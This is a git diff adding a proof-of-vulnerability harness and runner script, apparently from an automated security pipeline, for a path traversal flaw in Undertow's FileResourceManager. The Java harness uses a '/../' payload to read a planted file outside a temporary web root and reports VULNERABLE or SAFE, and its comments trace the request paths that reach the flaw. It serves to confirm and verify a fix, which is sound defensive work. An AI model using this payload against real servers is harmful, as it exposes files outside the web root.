@@ -1,0 +1,141 @@
+diff --git a/.security-pipeline/pov/PovPathTraversal.java b/.security-pipeline/pov/PovPathTraversal.java
+new file mode 100644
+index 0000000..4ba7134
+--- /dev/null
++++ b/.security-pipeline/pov/PovPathTraversal.java
+@@ -0,0 +1,100 @@
++import io.undertow.server.handlers.resource.FileResourceManager;
++import io.undertow.server.handlers.resource.Resource;
++
++import java.io.File;
++import java.io.FileWriter;
++import java.io.IOException;
++
++/**
++ * Proof-of-vulnerability for CWE-022 (Path Traversal) in
++ * io.undertow.server.handlers.resource.FileResourceManager#getResource(String).
++ *
++ * Root cause (shared sink for every trace in the alert):
++ *   core/src/main/java/io/undertow/server/handlers/resource/FileResourceManager.java
++ *   getResource(String p) builds `new File(base, path)` (line 89) from a
++ *   caller-supplied, effectively untrusted, relative path and returns a
++ *   Resource for it (line 90) WITHOUT ever verifying that the resolved
++ *   File's canonical path is still contained within `base`. The only
++ *   post-resolution check present is a case-sensitivity check
++ *   (`file.getCanonicalFile().getName().equals(file.getName())`), which
++ *   compares only the last path segment and does nothing to stop ".."
++ *   segments from walking the resolution outside of the configured
++ *   resource root.
++ *
++ * This harness calls the real, unmodified FileResourceManager API (no
++ * fakes/mocks) with a classic ".." traversal payload and confirms that the
++ * manager happily resolves and returns a Resource that points at a file
++ * living OUTSIDE the configured base directory - i.e. a directory-escape /
++ * arbitrary file disclosure primitive reachable by any caller that can
++ * influence the resource path (ResourceHandler, DefaultServlet.doGet via
++ * getPath(req) at DefaultServlet.java:129/134, and
++ * ServletContextImpl#getRealPath via CanonicalPathUtils.canonicalize at
++ * ServletContextImpl.java:313/316, all of which funnel into this exact
++ * sink).
++ *
++ * On the vulnerable code this program prints VULNERABLE and exits 0.
++ * On a correctly patched FileResourceManager (one that rejects/contains
++ * the resolution to `base`) the escaping resource will no longer be
++ * returned, this program prints SAFE and exits 1.
++ */
++public class PovPathTraversal {
++
++    public static void main(String[] args) throws Exception {
++        // Layout:
++        //   <tmp>/webroot/            <- configured FileResourceManager base ("safe" web root)
++        //   <tmp>/secret.txt          <- sensitive file OUTSIDE the web root
++        File tmp = new File(System.getProperty("java.io.tmpdir"), "undertow-pov-" + System.nanoTime());
++        File webroot = new File(tmp, "webroot");
++        if (!webroot.mkdirs()) {
++            throw new IOException("failed to create webroot dir " + webroot);
++        }
++        File secret = new File(tmp, "secret.txt");
++        try (FileWriter fw = new FileWriter(secret)) {
++            fw.write("TOP-SECRET-OUTSIDE-WEBROOT");
++        }
++
++        String secretCanonical = secret.getCanonicalPath();
++        System.out.println("[pov] webroot        = " + webroot.getCanonicalPath());
++        System.out.println("[pov] secret file     = " + secretCanonical);
++
++        FileResourceManager manager = new FileResourceManager(webroot, 1024);
++
++        // Classic parent-directory traversal payload. This is the same
++        // resolution path (FileResourceManager.getResource -> new File(base,
++        // path) -> return Resource, lines 80/89/90) that every trace in the
++        // alert converges on: the direct call (trace 1), the
++        // ServletContextImpl#getRealPath -> CanonicalPathUtils.canonicalize
++        // path (trace 2, which fails to strip ".." reached via
++        // backslash-delimited segments on Windows), and the
++        // DefaultServlet#doGet -> getPath(req) path (traces 3 & 4, which
++        // pass the raw servlet/path-info straight into getResource with no
++        // canonicalization at all).
++        String payload = "/../" + secret.getName();
++
++        Resource resource = manager.getResource(payload);
++
++        if (resource == null) {
++            System.out.println("SAFE: getResource(\"" + payload + "\") returned null (traversal blocked)");
++            System.exit(1);
++        }
++
++        File resolved = resource.getFile();
++        String resolvedCanonical = resolved.getCanonicalPath();
++        System.out.println("[pov] resolved file   = " + resolvedCanonical);
++
++        String webrootCanonical = webroot.getCanonicalPath();
++        boolean escapedBase = !resolvedCanonical.startsWith(webrootCanonical + File.separator)
++                && !resolvedCanonical.equals(webrootCanonical);
++        boolean isSecretFile = resolvedCanonical.equals(secretCanonical);
++
++        if (escapedBase && isSecretFile) {
++            System.out.println("VULNERABLE: FileResourceManager.getResource(\"" + payload
++                    + "\") escaped the configured base directory and returned the file outside webroot: "
++                    + resolvedCanonical);
++            System.exit(0);
++        } else {
++            System.out.println("SAFE: resolved resource stayed within base directory");
++            System.exit(1);
++        }
++    }
++}
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100755
+index 0000000..55c3435
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,29 @@
++#!/usr/bin/env bash
++# Proof-of-vulnerability runner for CWE-022 path traversal in
++# io.undertow.server.handlers.resource.FileResourceManager#getResource.
++#
++# Must be run inside /workspace/repo in the project container (see
++# run_in_docker.sh wrapper). Exits 0 when the vulnerable behavior is
++# reproduced (unpatched code), non-zero otherwise (patched code or build
++# failure).
++set -euo pipefail
++
++REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
++cd "$REPO_ROOT"
++
++POV_DIR="$REPO_ROOT/.security-pipeline/pov"
++WORK_DIR="$(mktemp -d)"
++trap 'rm -rf "$WORK_DIR"' EXIT
++
++echo "[run_pov] building core module..."
++mvn -q -B -pl core -am -DskipTests package
++
++echo "[run_pov] resolving core runtime classpath..."
++mvn -q -B -pl core dependency:build-classpath -Dmdep.outputFile="$WORK_DIR/cp.txt"
++CP="core/target/classes:$(cat "$WORK_DIR/cp.txt")"
++
++echo "[run_pov] compiling PoV harness..."
++javac -cp "$CP" -d "$WORK_DIR" "$POV_DIR/PovPathTraversal.java"
++
++echo "[run_pov] running PoV harness..."
++java -cp "$WORK_DIR:$CP" PovPathTraversal
